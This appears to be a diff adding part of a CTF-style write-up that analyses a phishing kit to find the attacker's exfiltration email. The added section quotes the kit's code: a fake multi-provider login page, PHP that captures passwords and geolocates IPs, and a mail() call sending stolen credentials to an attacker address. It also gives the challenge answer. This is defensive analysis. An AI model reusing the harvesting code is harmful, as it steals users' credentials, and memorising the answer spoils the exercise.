@@ -146,7 +146,198 @@ You could also do it this way: `grep -RE --binary-files=without-match "[a-zA-Z0-
 ./Scriptup/marvid:	$headers = "From: Blessing <blessing@heaven.com>";
 ```
 
-Lots of stuff! But only a couple emails. Now, you can just trial and error these to see which is the answer, but it's important to actually understand "why?" it's the answer.
+Lots of stuff! But only a couple emails. Now, you can just trial and error these to see which is the answer, but it's important to actually understand "why?" it's the answer. Let's look at the contents of each file, starting with `updat.cmd`
+
+#### updat.cmd
+This file appears to be the front page of the phishing kit. It asks the user to select the client they wish to login with to access the attachment. Presumabely each of these lead to a fake login page.
+```
+<div class="foot-lnk">To access the attached document, Select with email provider below. </div>
+...
+<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
+  <div class="login-form">
+    <div class="sign-in-htm">
+      <div class="group">
+        <div class="btn-3 loginBtn loginBtn--office"><a href="o1">Login with Office 365</a></div>
+      </div>
+      <div class="group">
+        <div class="btn-3 loginBtn loginBtn--outlook"><a href="o4">Login with Outlook</a></div>
+      </div>
+      <div class="group">
+        <div class="btn-3 loginBtn loginBtn--aol"><a href="a2">Login with Aol</a></div>
+      </div>
+      <div class="group">
+    <div class="btn-3 loginBtn loginBtn--yahoo"><a href="y3">Login with Yahoo</a></div>
+      </div>
+      <div class="group">
+        <div class="btn-3 loginBtn loginBtn--other"><a href="o6">Login with Other Mail</a></div>
+```
+
+It catches the email and password entered.
+```
+$message .= "E: " . $_GET['email'] . "\n"; 
+$message .= "Ps: " . $_GET['password'] . "\n";
+```
+
+It collects the IP address and attempts to geolocate it.
+```
+//get user's ip address 
+$geoplugin->locate();
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
+$ip = $_SERVER['HTTP_CLIENT_IP']; 
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
+} else { 
+$ip = $_SERVER['REMOTE_ADDR']; 
+}
+...
+$message .= "IP : " .$ip. "\n"; 
+$message .= "--------------------------\n";
+$message .=     "City: {$geoplugin->city}\n";
+$message .=     "Region: {$geoplugin->region}\n";
+$message .=     "Country Name: {$geoplugin->countryName}\n";
+$message .=     "Country Code: {$geoplugin->countryCode}\n";
+```
+
+The exfiltration email that it wants to send data to appears to be `jamestanner2299@gmail.com`
+```
+$to ="jamestanner2299@gmail.com"
+```
+
+However, it doesn't seem like this file would even run. For starters, a signficant portion is commented out (`<!--,-->`).
+```
+<!--<div class="top"></div>-->
+    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
+		
+    //get user's ip address 
+    $geoplugin->locate();
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
+    $ip = $_SERVER['HTTP_CLIENT_IP']; 
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
+    } else { 
+    $ip = $_SERVER['REMOTE_ADDR']; 
+    }
+
+    $message = "";
+	$message .= "---|BLESSINGS|---\n";
+    $message .= "Email Provider: Yahoo\n";
+    $message .= "E: " . $_GET['email'] . "\n"; 
+    $message .= "Ps: " . $_GET['password'] . "\n"; 
+    $message .= "IP : " .$ip. "\n"; 
+    $message .= "--------------------------\n";
+    $message .=     "City: {$geoplugin->city}\n";
+    $message .=     "Region: {$geoplugin->region}\n";
+    $message .=     "Country Name: {$geoplugin->countryName}\n";
+    $message .=     "Country Code: {$geoplugin->countryCode}\n";
+    $message .= "--------------------------\n";
+
+	$to ="jamestanner2299@gmail.com"
+		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
+```
+
+There also doesn't appear to be any `<?php ?>` tags, which PHP requires to run afaik. Some statements are also missing semicolons (`;`) to complete the line. There's no function or statement to actually send the data to the specified email. For reasons I can't tell, there's also duplicated code blocks, suggesting that this is a very amataeur, and poorly developed phishing kit. At first glance, it might seem that `jamestanner2299@gmail.com` is the right answer, but the file wouldn't actually do anything, so I don't believe that's correct.
+
+#### script.st
+This script looks almost the same as the previous one, except no duplicated code. The goal appears to be the same outcome - collect and exfiltrate credentials to a phishing email. Though this script would also not work as it is plagued with many of the same syntax errors as the previous script. Not much more analysis to be done with this one.
+
+#### pagesc.koo
+Here is where we start to see a pattern emerge. Yet another file that attempts to do the same thing as the others. This one is even more closely resembling the contents of `updat.cmd`. So now we have three different scripts that appear to attempt the same thing, except in multiple file formats (`.cmd`, `.st`, `.koo`) and in different locations. It almost seems like the adversary was trying and failing to create this over and over again without much care.
+
+#### cleanup
+Same thing.
+
+#### pagescir
+Same thing.
+
+#### update
+Same thing.
+
+...
+
+I think you get the idea. I'll just skip to the part where I find something.
+
+#### resubmit.php
+I finally found it. `Update365/office365/Validation` looks like what would actually capture and exfil stolen credentials. This file does a couple different things. Despite the fact that the code is messy to the point of comical, it actually has proper PHP tags!
+
+1. Blocks direct page visits so no one can just visit it:
+```
+if ($_SERVER['REQUEST_METHOD'] == 'GET')
+{
+print '
+<html><head>
+<title>403 - Forbidden</title>
+</head><body>
+<h1>403 Forbidden</h1>
+<p></p>
+<hr>
+</body></html>
+';
+exit;
+}
+```
+
+2. Generates a random URL that the target is directed to:
+```
+function random_number(){
+	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
+	$key = array_rand($numbers);
+	return $numbers[$key];
+}
+
+$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
+header('location:'.$url);
+```
+
+3. Collects the vistims information like country, IP, address, email, password, etc:
+```
+$country = visitor_country();
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$adddate = date("D M d, Y g:i a");
+$from = $_SERVER['SERVER_NAME'];
+$ip = getenv("REMOTE_ADDR");
+$hostname = gethostbyaddr($ip);
+$email = $_POST['email'];
+$password = $_POST['password'];
+$passchk = strlen($password);
+...
+function visitor_country()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryName != null)
+    {
+        $result = $ip_data->geoplugin_countryName;
+    }
+
+    return $result;
+}
+```
+
+4. Actually send stolen data to the attacker's email:
+```
+mail("m3npat@yandex.com",$bron,$message,$lagi)
+```
+
+It does some other things, but these are the highlights. Especially the email sending part. The attacker uses `mail()`, a built in PHP function to achieve this. The email in question is `m3npat@yandex.com`. With that, we **finally** have our answer!
+
+**Answer**: m3npat@yandex.com
 
 ### Question 10 - The adversary used other email addresses in the obtained phishing kit. What is the email address that ends in "@gmail.com"?
 
